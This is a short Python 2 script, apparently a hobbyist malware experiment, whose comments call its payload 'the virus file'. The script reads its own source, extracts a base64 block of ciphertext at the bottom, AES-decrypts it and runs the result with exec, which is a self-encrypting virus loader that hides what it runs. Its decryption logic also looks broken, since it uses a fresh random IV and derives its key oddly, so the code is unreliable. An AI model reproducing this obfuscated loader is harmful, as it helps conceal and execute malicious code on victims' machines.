print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#WEXREHj5YuM7wdMSZfAWrkVJM4amNDQ7fdK2TKxvxMPyS6HU/qyWog8KJRyuh/hD0/k6lJdUxL2boWPdjuPhgj78IVHLMWndYBAHMF0/wiqa5u5RyzFRF/+jnXIa9JDip66sC+TSdP4QGhyhe2kcHYWgkB5ho/Q5tXCxi5grIqocMinftNx5QiPMubuVki6QPoV+NGpmIjeohFYD05yKsIoDumG8pqv0MQIvZTAOVcZtX1mmOyN5j7xkw4FMre2jpwUDBoMTwNwZACP0GLfk+Pg4RbLWTexIlwJGVpDA7fHvwQdk7oaFgsEK37Me48GuvaL8kO2Yoy9X+hqUtOPBbPTdE4iH35RODUneu4S6lo7/5LzTVoTC3eK8WJ5m3FJpWvXlAuG9i3sFH442dfs8d2sP0qQayYVs/ouOWcWNb+bUv6ySXLsOnI611ACHFN8PQPuXHF1GSE815ihU4XZ0McvUjgM8i9nae2Vs6kJuzu9HeXKMMkWxa74DJzGECAdwQG8xMut4AkiTHgtDudgDBqPQMP/kSp3ntOEMLKygvw4N5Fmc+tD1tEYnkScX91T2IFud+XUeHGYBVhn5QmlirM9AMPKHLXZrxPSaNoMpevEGGhK19ZHzzQvVU3ZEczdrZloviyFH70yfGhoSuMush4cWTqJjGZQ9HZHA8EWOTLft0pMyKgE4960bxSWOGh8Q9J6BqFNxy0u96kEuZqyViFiNoBAyTrO7F5PddG1SeD1zGoWXxgdGNHf3R4yYMyQ2JYFT3zXcOxwrc9y8nZ5yrbTgjpZrq0263DOzipJjm+7UjNCm07b60Fz/pSS1fNNXZ8rmqEqod0+due5BBF5xltNQP66KJyjcUGgm1rT9FN7ZQXfYcdKTw8R7qFrgKYinN7F+vMQ4bSFuVuboB3/w6o/llh9HMX81HtkWxlVeDJBZJUoa+8b0ynfgKNST/I8md+lHWbzt1qjk1UnD5xXK2jHzq5pBshOMj78wK08L7Zd0xmyLquDENod0+Zhra0JXaev84HS8Tb1JMl+sTYIeFwbXMm3g/ALiWRMXWL8IREWNDiR6sfllL2p1XLxMSVnQAHxpkpFjwvS05sb1WQsq2P1hBFcrBwB5Yo9SkM4ONw8e5xXgqqlGLSdMEvKzE6TNxI+H6N72AGxqmnF2euEXojyV/zRp8ea9RcJ7TuYBKgYwFCQh7Whmq6yOG8qWlbWre/fQ1C1TK0wG/VfMcOgc13DyjR8f/DwBKmL74xenbOixGPMVyK10lKJUMnlsSRNQ/ohMykd8qfkkpDaBMjFAbt2fTJ7Zt6EK8ILUoNt5Jd2hPeOS98tSOZzJappa1ZpfaPhA2IKUFesl/s4Q14bFa1/V+pWy9/CSIBLOPamt6rjnLkP7/cAo9MGZb0oNNM3z8C1W9+8yWbI59SA2iORJJ/Cq6sqNGGCYDnWIGgwq9kYzKXLHSUsWtjFJ+QyMgB4uOlKR5pTEoLHUuhD/kjMK0ZAMyIGnuCwEa5HC6BbuOCVrNv8arSWZ7Iv4oyIF8yg6IrICgtD0W/osIjrD/2wO2NZL4WcyYf0sa0KGE8KtZvTRbmXJf14T2dgMiEkUuj02Kh+ppGeE6NSpHuHFC1/a9XLjafKlrXuH/eJ+dSdXpTUitd6EVtFXfxZ8F4zIHfsIgwxO6S3qwpPpUXNdnYMD5+bDmB8RBaQivrFVB2ho9FcIbpXQrPXGNzRXZhoTSIJbxLGztzWGgg34lxLQT5rCppAkcm++lnCx5DDjtmwPiT7Xin+nU9vPnXCgpG65QcmVPPx6x2dirB7TXdMTAS6adUWX5GojYcPVbmgZoP1kZpR/PjOQLeskLkDCyCYL+YJOsuEv8wn2y1h3R46UE4RyKNsMlrni6qsp8T+b5bZQgC9Rcr2PZU7KUVLOfZ3Ykt2Ui6r1U1qTqAFaf2yqTMjmzgkmGjle0M1nZCuZYD8ZO8BEHfvjWl4yRWCCZGC0sWhTSRktjXV6r8H88aZWGzsLjqsAT5rSSaOOrw2aknaiF5z+lubGuHLSzMBh1GJ+TmmTMw+QPvZdgYsxkL9FqzmQzTTBDdkVCT9l5FbXoYljSryJ0KRn/6Qx0g1B/6Slifllq75nOK00L0qi6nn0q20YkK1kpqEvF8MmMnGclOWkJ02FA6MC369jKZel2AXzqHpQ/mFi96x3UPMSRISPX1cux6Qz4nhn+AmtFiMozxFFRlHfikZ+WxzM2uQGqmpdwq+qGCFuSakCRUazU43rLJIUA3qsLtN19GMlikrpNa7cuAJsEEH9RQfItjfnNo2eeqB5N/zCMhXcU25onBsWdTD1i4G3AjEk3feiLthM4PV8iimU7Xwj3P7h8AfTqHodQt8Rgrn6JTssPHrGDV8pBPLkZU/QgLe6R+bXGZUMNj6IpsoUhsV+JKJfKWXghaiPdOkINrf0bpwBYcWkpTWH8h0wFlstxt8TXLlcTSF0ue+ZC0gSKg8L8WVIGXsafwZC0VxBxvOFSsvReKU9uVKwG3LC9g865LNL5x6vegqjTntMYKR2sBINkRWWo7oBRkKdeAIDsR/Fq1KPldwtPz0yOXvwyBknryp1Ctan0nl5faf5BRh8vMehy12s7nyxgWrdTnEw6XKNPs7DzEoFPIk6fc/aCDfL0WES/OotIAmx2kZb9nws8D4Ek/x7KS1Fl2e4iqehtZFZ/5B66m4tTrouGorLlD+t18vRmoG/XMZ9vB6+Ot4lsxipqbrBQXM8wqURPYbfsSc6aUQWZKavjA==
# End payload